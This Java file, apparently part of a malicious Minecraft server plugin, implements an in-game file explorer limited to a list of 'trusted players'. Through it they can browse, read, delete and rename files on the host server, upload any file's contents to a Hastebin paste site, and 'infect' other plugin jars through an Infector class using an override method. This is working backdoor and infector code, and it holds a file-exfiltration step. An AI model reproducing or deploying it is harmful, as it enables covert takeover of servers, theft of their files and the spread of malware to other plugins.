package tk.expcode.expcode.explorer;

import net.md_5.bungee.api.chat.ClickEvent;
import net.wesjd.anvilgui.AnvilGUI;
import org.apache.commons.io.FileUtils;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.Material;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.inventory.InventoryClickEvent;
import org.bukkit.inventory.ItemStack;
import tk.expcode.expcode.ExpCode;
import tk.expcode.expcode.builders.ItemStackBuilder;
import tk.expcode.expcode.builders.TextComponentBuilder;
import tk.expcode.expcode.infector.InfectMethode;
import tk.expcode.expcode.infector.Infector;
import tk.expcode.expcode.utils.Hastebin;

import java.io.File;
import java.io.IOException;
import java.nio.charset.Charset;
import java.util.List;

public class ExplorerNavigation implements Listener {

    private final ExpCode main;

    public ExplorerNavigation(ExpCode main) {
        this.main = main;
    }

    @EventHandler
    public void onFolderClick(InventoryClickEvent event) throws IOException {
        if (!main.getTrustedPlayers().contains(event.getWhoClicked().getName())) return;
        if (!event.getView().getTitle().contains(ChatColor.translateAlternateColorCodes('&',
                "&dExplorer ")) || !event.getView().getTitle().endsWith(")")) return;
        if (!main.getExplorerFile().containsKey(event.getWhoClicked().getName())) return;
        event.setCancelled(true);
        if (event.getCurrentItem().equals(new ItemStackBuilder(Material.ARROW)
                .displayName(ChatColor.translateAlternateColorCodes('&', "&aGet full Path"))
                .toItemStack())) {
            event.getWhoClicked().closeInventory();
            event.getWhoClicked().sendMessage(main.getExplorerFile()
                    .get(event.getWhoClicked().getName()).getAbsolutePath());
        } else if (event.getCurrentItem().equals(new ItemStackBuilder(Material.BARRIER)
                .displayName(ChatColor.translateAlternateColorCodes('&', "&cGo Back"))
                .toItemStack())) {
            if (main.getExplorerFile().get(event.getWhoClicked().getName()).getParent() == null) return;
            main.getExplorerFile().put(event.getWhoClicked().getName(), main.getExplorerFile()
                    .get(event.getWhoClicked().getName()).getParentFile());
            main.getFileInventory().openFolder(event.getWhoClicked(), main.getExplorerFile().get(event.getWhoClicked().getName()), 1);
        } else if (event.getCurrentItem().getType().equals(Material.STORAGE_MINECART)) {
            if (!event.getCurrentItem().getItemMeta().getDisplayName().startsWith(ChatColor
                    .translateAlternateColorCodes('&', "&9"))) return;
            String path = main.getExplorerFile().get(event.getWhoClicked().getName()).getAbsolutePath();
            File newFolder = new File(path + (main.isLinux() ? '/' : '\\') +
                    event.getCurrentItem().getItemMeta().getDisplayName()
                            .replace(ChatColor.translateAlternateColorCodes('&', "&9"), ""));
            main.getExplorerFile().put(event.getWhoClicked().getName(), newFolder);
            main.getFileInventory().openFolder(event.getWhoClicked(), main.getExplorerFile().get(event.getWhoClicked().getName()), 1);
        } else if (event.getCurrentItem().getType().equals(Material.PAPER)) {
            if (!event.getCurrentItem().getItemMeta().getDisplayName().startsWith(ChatColor
                    .translateAlternateColorCodes('&', "&6"))) return;
            String path = main.getExplorerFile().get(event.getWhoClicked().getName()).getAbsolutePath();
            File file = new File(path + (main.isLinux() ? '/' : '\\') +
                    event.getCurrentItem().getItemMeta().getDisplayName()
                            .replace(ChatColor.translateAlternateColorCodes('&', "&6"), ""));
            main.getExplorerFile().put(event.getWhoClicked().getName(), file);
            main.getFileInventory().openFile(event.getWhoClicked(), main.getExplorerFile().get(event.getWhoClicked().getName()));
        } else if (event.getCurrentItem().equals(new ItemStackBuilder(Material.REDSTONE)
                .displayName(ChatColor.translateAlternateColorCodes('&', "&eReload"))
                .toItemStack())) {
            main.getFileInventory().openFolder(event.getWhoClicked(), main.getExplorerFile().get(event.getWhoClicked().getName()), 1);
        } else if (event.getCurrentItem().equals(new ItemStackBuilder(Material.MILK_BUCKET)
                .displayName(ChatColor.translateAlternateColorCodes('&', "&7Paste"))
                .toItemStack())) {
            if (!main.getCopiedFile().containsKey(event.getWhoClicked().getName()))
                event.getWhoClicked().sendMessage(ChatColor.translateAlternateColorCodes('&',
                        main.getMessagePrefix() + "&cYou have copied no Files!"));
            else {
                File file = new File(main.getExplorerFile().get(event.getWhoClicked().getName()).getAbsolutePath() +
                        '\\' + main.getCopiedFile().get(event.getWhoClicked().getName()).getName());
                FileUtils.copyFile(main.getCopiedFile().get(event.getWhoClicked().getName()), file);
            }
        } else if (event.getCurrentItem().equals(new ItemStackBuilder(Material.MAP)
                .displayName(ChatColor.translateAlternateColorCodes('&', "&aCreate new File"))
                .toItemStack())) {
            File folder = main.getExplorerFile().get(event.getWhoClicked().getName());
            new AnvilGUI.Builder()
                    .onClose(player ->
                            main.getFileInventory().openFolder(event.getWhoClicked(),
                                    main.getExplorerFile().get(event.getWhoClicked().getName()), 1))
                    .onComplete((player, text) -> {
                        File file = new File(folder.getAbsolutePath() + (main.isLinux() ? '/' : '\\') + text);
                        try {
                            if (!file.exists() && file.createNewFile()) {
                                event.getWhoClicked().sendMessage(ChatColor.translateAlternateColorCodes('&',
                                        main.getMessagePrefix() + "&aFile successfully created!"));
                            } else event.getWhoClicked().sendMessage(ChatColor.translateAlternateColorCodes('&',
                                    main.getMessagePrefix() + "&cFile could not be created!"));
                        } catch (IOException e) { throw new RuntimeException(e); }
                        return AnvilGUI.Response.close();
                    })
                    .text("New File")
                    .itemLeft(new ItemStack(Material.MAP))
                    .title(ChatColor.translateAlternateColorCodes('&',
                            "&2Create new File"))
                    .plugin(main.getPlugin())
                    .open((Player) event.getWhoClicked());
        } else if (event.getCurrentItem().equals(new ItemStackBuilder(Material.ENDER_CHEST)
                .displayName(ChatColor.translateAlternateColorCodes('&', "&aCreate new Folder"))
                .toItemStack())) {
            File folder = main.getExplorerFile().get(event.getWhoClicked().getName());
            new AnvilGUI.Builder()
                    .onClose(player ->
                            main.getFileInventory().openFolder(event.getWhoClicked(),
                                    main.getExplorerFile().get(event.getWhoClicked().getName()), 1))
                    .onComplete((player, text) -> {
                        File newFolder = new File(folder.getAbsolutePath() + (main.isLinux() ? '/' : '\\') + text);
                        if (!newFolder.exists() && newFolder.mkdirs()) {
                            event.getWhoClicked().sendMessage(ChatColor.translateAlternateColorCodes('&',
                                    main.getMessagePrefix() + "&aFolder successfully created!"));
                        } else event.getWhoClicked().sendMessage(ChatColor.translateAlternateColorCodes('&',
                                main.getMessagePrefix() + "&cFolder could not be created!"));
                        return AnvilGUI.Response.close();
                    })
                    .text("New Folder")
                    .itemLeft(new ItemStack(Material.MAP))
                    .title(ChatColor.translateAlternateColorCodes('&',
                            "&2Create new Folder"))
                    .plugin(main.getPlugin())
                    .open((Player) event.getWhoClicked());
        } else if (event.getCurrentItem().equals(new ItemStackBuilder(Material.FLINT)
                .displayName(ChatColor.translateAlternateColorCodes('&', "&7Next Page"))
                .toItemStack())) {
            main.getFileInventory().openFolder(event.getWhoClicked(), main.getExplorerFile().get(event.getWhoClicked().getName()),
                    main.getExplorerPage().get(event.getWhoClicked().getName()) + 1);
        } else if (event.getCurrentItem().equals(new ItemStackBuilder(Material.FLINT)
                .displayName(ChatColor.translateAlternateColorCodes('&', "&7Previous Page"))
                .toItemStack())) {
            main.getFileInventory().openFolder(event.getWhoClicked(), main.getExplorerFile().get(event.getWhoClicked().getName()),
                    main.getExplorerPage().get(event.getWhoClicked().getName()) - 1);
        }
    }

    @EventHandler
    public void onFileClick(InventoryClickEvent event) throws IOException {
        if (!main.getTrustedPlayers().contains(event.getWhoClicked().getName())) return;
        if (!event.getView().getTitle().contains(ChatColor.translateAlternateColorCodes('&',
                "&aFile (")) || !event.getView().getTitle().endsWith(")")) return;
        if (!main.getExplorerFile().containsKey(event.getWhoClicked().getName())) return;
        event.setCancelled(true);
        if (event.getCurrentItem().equals(new ItemStackBuilder(Material.BARRIER)
                .displayName(ChatColor.translateAlternateColorCodes('&', "&cGo Back"))
                .toItemStack())) {
            if (main.getExplorerFile().get(event.getWhoClicked().getName()).getParent() == null) return;
            main.getExplorerFile().put(event.getWhoClicked().getName(), main.getExplorerFile()
                    .get(event.getWhoClicked().getName()).getParentFile());
            main.getFileInventory().openFolder(event.getWhoClicked(), main.getExplorerFile().get(event.getWhoClicked().getName()), 1);
        } else if (event.getCurrentItem().equals(new ItemStackBuilder(Material.BUCKET)
                .displayName(ChatColor.translateAlternateColorCodes('&',
                        "&7Copy"))
                .toItemStack())) {
            main.getCopiedFile().put(event.getWhoClicked().getName(), main.getExplorerFile().get(
                    event.getWhoClicked().getName()));
            event.getWhoClicked().sendMessage(ChatColor.translateAlternateColorCodes('&',
                    main.getMessagePrefix() + "&aYou have Copied the File!"));
        } else if (event.getCurrentItem().equals(new ItemStackBuilder(Material.REDSTONE_COMPARATOR)
                .displayName(ChatColor.translateAlternateColorCodes('&',
                        "&cDelete"))
                .toItemStack())) {
            File file = main.getExplorerFile().get(event.getWhoClicked().getName());
            if (main.getExplorerFile().get(event.getWhoClicked().getName()).getParent() == null) return;
            main.getExplorerFile().put(event.getWhoClicked().getName(), main.getExplorerFile()
                    .get(event.getWhoClicked().getName()).getParentFile());
            if (file.delete()) event.getWhoClicked().sendMessage(ChatColor.translateAlternateColorCodes('&',
                    main.getMessagePrefix() + "&aFile successfully deleted!"));
            else event.getWhoClicked().sendMessage(ChatColor.translateAlternateColorCodes('&',
                    main.getMessagePrefix() + "&cFile could not be deleted!"));
            main.getFileInventory().openFolder(event.getWhoClicked(), main.getExplorerFile().get(event.getWhoClicked().getName()), 1);
        } else if (event.getCurrentItem().equals(new ItemStackBuilder(Material.ARROW)
                .displayName(ChatColor.translateAlternateColorCodes('&', "&aGet full Path"))
                .toItemStack())) {
            event.getWhoClicked().closeInventory();
            event.getWhoClicked().sendMessage(main.getExplorerFile()
                    .get(event.getWhoClicked().getName()).getAbsolutePath());
        } else if (event.getCurrentItem().equals(new ItemStackBuilder(Material.FEATHER)
                .displayName(ChatColor.translateAlternateColorCodes('&',
                        "&dRename"))
                .toItemStack())) {
            File file = main.getExplorerFile().get(event.getWhoClicked().getName());
            new AnvilGUI.Builder()
                    .onClose(player ->
                            main.getFileInventory().openFolder(event.getWhoClicked(),
                                    main.getExplorerFile().get(event.getWhoClicked().getName()), 1))
                    .onComplete((player, text) -> {
                        main.getExplorerFile().put(event.getWhoClicked().getName(), main.getExplorerFile()
                                .get(event.getWhoClicked().getName()).getParentFile());
                        if (file.renameTo(new File(file.getParentFile().getAbsolutePath() +
                                (main.isLinux() ? '/' : '\\') + text))) event.getWhoClicked()
                                .sendMessage(ChatColor.translateAlternateColorCodes('&',
                                        main.getMessagePrefix() + "&aFile successfully renamed!"));
                        else event.getWhoClicked().sendMessage(ChatColor.translateAlternateColorCodes('&',
                                main.getMessagePrefix() + "&cFile could not be renamed!"));
                        return AnvilGUI.Response.close();
                    })
                    .text(file.getName())
                    .itemLeft(new ItemStack(Material.PAPER))
                    .title(ChatColor.translateAlternateColorCodes('&',
                            "&2Rename (" + file.getName() + ")"))
                    .plugin(main.getPlugin())
                    .open((Player) event.getWhoClicked());
        } else if (event.getCurrentItem().equals(new ItemStackBuilder(Material.PAPER)
                .displayName(ChatColor.translateAlternateColorCodes('&',
                        "&6Read"))
                .toItemStack())) {
            main.getFileInventory().readFile(event.getWhoClicked(), main.getExplorerFile().get(event.getWhoClicked().getName()),
                    main.getExplorerPage().get(event.getWhoClicked().getName()));
        } else if (event.getCurrentItem().equals(new ItemStackBuilder(Material.BONE)
                .displayName(ChatColor.translateAlternateColorCodes('&',
                        "&bHastebin"))
                .toItemStack())) {
            Bukkit.getScheduler().runTaskAsynchronously(main.getPlugin(), () -> {
                File file = main.getExplorerFile().get(event.getWhoClicked().getName());
                List<String> lines;
                try { lines = FileUtils.readLines(file, Charset.defaultCharset()); }
                catch (IOException e) { throw new RuntimeException(e); }
                StringBuilder text = new StringBuilder();
                lines.forEach(line -> text.append(line).append('\n'));
                String link;
                try { link = new Hastebin().post(text.toString(), false); }
                catch (IOException e) { throw new RuntimeException(e); }
                String finalLink = link;
                Bukkit.getScheduler().runTask(main.getPlugin(), () -> {
                    event.getWhoClicked().closeInventory();
                    event.getWhoClicked().sendMessage(ChatColor.translateAlternateColorCodes('&',
                            main.getMessagePrefix() + "&9" + file.getName() + " &8-> &b" + finalLink));
                });
            });
        } else if (event.getCurrentItem().equals(new ItemStackBuilder(Material.FIREBALL)
                .displayName(ChatColor.translateAlternateColorCodes('&',
                        "&cCopy to this Jar"))
                .toItemStack())) {
            Bukkit.getScheduler().runTaskAsynchronously(main.getPlugin(), () -> {
                switch (new Infector(main)
                        .setPluginFile(main.getExplorerFile().get(event.getWhoClicked().getName()))
                        .setInfectionMethode(InfectMethode.OVERRIDE)
                        .infect()) {
                    case SUCCESS -> event.getWhoClicked().sendMessage(ChatColor.translateAlternateColorCodes('&',
                            main.getMessagePrefix() + "&aFile successfully infected!"));
                    case FILE_OR_METHODE_IS_NULL -> event.getWhoClicked().sendMessage(ChatColor.translateAlternateColorCodes('&',
                            main.getMessagePrefix() + "&cFile or Methode is null!"));
                    case PARENT_FILE_IS_NO_DIRECTORY -> event.getWhoClicked().sendMessage(ChatColor.translateAlternateColorCodes('&',
                            main.getMessagePrefix() + "&cParent file is no Directory!"));
                    case FILE_IS_NOT_A_JAR -> event.getWhoClicked().sendMessage(ChatColor.translateAlternateColorCodes('&',
                            main.getMessagePrefix() + "&cFile is not a Jar!"));
                    case CANNOT_CONVERT_TO_ZIP -> event.getWhoClicked().sendMessage(ChatColor.translateAlternateColorCodes('&',
                            main.getMessagePrefix() + "&cCan't convert to .zip!"));
                    case UNZIPPING_FAILURE -> event.getWhoClicked().sendMessage(ChatColor.translateAlternateColorCodes('&',
                            main.getMessagePrefix() + "&cUnzipping failure!"));
                    case CANNOT_CREATE_INFECTION_DIRECTORY -> event.getWhoClicked().sendMessage(ChatColor.translateAlternateColorCodes('&',
                            main.getMessagePrefix() + "&cCan't create infection directory!"));
                    case CANNOT_CREATE_ZIP_DEST_DIRECTORY_INFECTED_PLUGIN -> event.getWhoClicked().sendMessage(ChatColor.translateAlternateColorCodes('&',
                            main.getMessagePrefix() + "&cCan't create dest directory for infected Plugin!"));
                    case CANNOT_CREATE_ZIP_DEST_DIRECTORY_BASE_PLUGIN -> event.getWhoClicked().sendMessage(ChatColor.translateAlternateColorCodes('&',
                            main.getMessagePrefix() + "&cCan't create dest directory for base Plugin!"));
                    case CANNOT_COPY_FILE_INFECTED_PLUGIN -> event.getWhoClicked().sendMessage(ChatColor.translateAlternateColorCodes('&',
                            main.getMessagePrefix() + "&cCan't copy the infected plugin file!"));
                    case CANNOT_COPY_FILE_BASE_PLUGIN -> event.getWhoClicked().sendMessage(ChatColor.translateAlternateColorCodes('&',
                            main.getMessagePrefix() + "&cCan't copy the base plugin file!"));
                    case BASE_PLUGIN_FILE_IS_NULL -> event.getWhoClicked().sendMessage(ChatColor.translateAlternateColorCodes('&',
                            main.getMessagePrefix() + "&cNo Plugin file for the Base Plugin set!"));
                    case CANNOT_DELETE_THE_INFECTION_DIRECTORY -> event.getWhoClicked().sendMessage(ChatColor.translateAlternateColorCodes('&',
                            main.getMessagePrefix() + "&cCan't delete the infection directory!"));
                    case SOME_CODE_DEST_ALREADY_EXISTS -> event.getWhoClicked().sendMessage(ChatColor.translateAlternateColorCodes('&',
                            main.getMessagePrefix() + "&cSome code dest already exists!"));
                    case CANNOT_CREATE_SOME_OF_THE_CODE_COPY_DEST_FILES -> event.getWhoClicked().sendMessage(ChatColor.translateAlternateColorCodes('&',
                            main.getMessagePrefix() + "&cCan't create some of the code dest files!"));
                    case PLUGIN_YML_DONT_EXISTS -> event.getWhoClicked().sendMessage(ChatColor.translateAlternateColorCodes('&',
                            main.getMessagePrefix() + "&cPlugin.yml don't exists!"));
                    case PLUGIN_YML_CANNOT_BE_READ -> event.getWhoClicked().sendMessage(ChatColor.translateAlternateColorCodes('&',
                            main.getMessagePrefix() + "&cPlugin.yml can't be read!"));
                    case PLUGIN_YML_CANNOT_BE_WRITTEN -> event.getWhoClicked().sendMessage(ChatColor.translateAlternateColorCodes('&',
                            main.getMessagePrefix() + "&cPlugin.yml can't be written!"));
                    case IMPORTANT_CODE_DIRECTORY_DONT_EXISTS -> event.getWhoClicked().sendMessage(ChatColor.translateAlternateColorCodes('&',
                            main.getMessagePrefix() + "&cAn important code directory don't exists!"));
                    case CANNOT_COPY_DIRECTORY -> event.getWhoClicked().sendMessage(ChatColor.translateAlternateColorCodes('&',
                            main.getMessagePrefix() + "&cCan't copy an important directory!"));
                    default -> event.getWhoClicked().sendMessage(ChatColor.translateAlternateColorCodes('&',
                            main.getMessagePrefix() + "&cAn unknown error has occurred!"));
                }
            });
            event.getWhoClicked().closeInventory();
        } else if (event.getCurrentItem().equals(new ItemStackBuilder(Material.DIAMOND)
                .displayName(ChatColor.translateAlternateColorCodes('&',
                        "&dSet as Base Plugin"))
                .toItemStack())) {
            main.setPluginFile(main.getExplorerFile().get(event.getWhoClicked().getName()));
            event.getWhoClicked().sendMessage(ChatColor.translateAlternateColorCodes('&',
                    main.getMessagePrefix() + "&aFile set as Base Plugin!"));
        }
    }

    @EventHandler
    public void onReadClick(InventoryClickEvent event) throws IOException {
        if (!main.getTrustedPlayers().contains(event.getWhoClicked().getName())) return;
        if (!event.getView().getTitle().contains(ChatColor.translateAlternateColorCodes('&',
                "&9Read ")) || !event.getView().getTitle().endsWith(")")) return;
        if (!main.getExplorerFile().containsKey(event.getWhoClicked().getName())) return;
        event.setCancelled(true);
        if (event.getCurrentItem().equals(new ItemStackBuilder(Material.BARRIER)
                .displayName(ChatColor.translateAlternateColorCodes('&', "&cGo Back"))
                .toItemStack())) {
            main.getFileInventory().openFile(event.getWhoClicked(), main.getExplorerFile().get(event.getWhoClicked().getName()));
        } else if (event.getCurrentItem().equals(new ItemStackBuilder(Material.REDSTONE)
                .displayName(ChatColor.translateAlternateColorCodes('&', "&eReload"))
                .toItemStack())) {
            main.getFileInventory().readFile(event.getWhoClicked(), main.getExplorerFile().get(event.getWhoClicked().getName()), 1);
        } else if (event.getCurrentItem().equals(new ItemStackBuilder(Material.FLINT)
                .displayName(ChatColor.translateAlternateColorCodes('&', "&7Next Page"))
                .toItemStack())) {
            main.getFileInventory().readFile(event.getWhoClicked(), main.getExplorerFile().get(event.getWhoClicked().getName()),
                    main.getExplorerPage().get(event.getWhoClicked().getName()) + 1);
        } else if (event.getCurrentItem().equals(new ItemStackBuilder(Material.FLINT)
                .displayName(ChatColor.translateAlternateColorCodes('&', "&7Previous Page"))
                .toItemStack())) {
            main.getFileInventory().readFile(event.getWhoClicked(), main.getExplorerFile().get(event.getWhoClicked().getName()),
                    main.getExplorerPage().get(event.getWhoClicked().getName()) - 1);
        } else if (event.getCurrentItem().getType().equals(Material.PAPER)) {
            if (!event.getCurrentItem().getItemMeta().getDisplayName().startsWith(ChatColor
                    .translateAlternateColorCodes('&', "&b"))) return;
            String line = event.getCurrentItem().getItemMeta().getDisplayName().replace(ChatColor
                    .translateAlternateColorCodes('&', "&b"), "");
            new TextComponentBuilder()
                    .setText(ChatColor.translateAlternateColorCodes('&',
                            main.getMessagePrefix() + "&bClick here to change the line! (STOP to cancel)"))
                    .setClickEvent(ClickEvent.Action.SUGGEST_COMMAND, line)
                    .showToPlayer((Player) event.getWhoClicked());
            event.getWhoClicked().closeInventory();
        }
    }
}
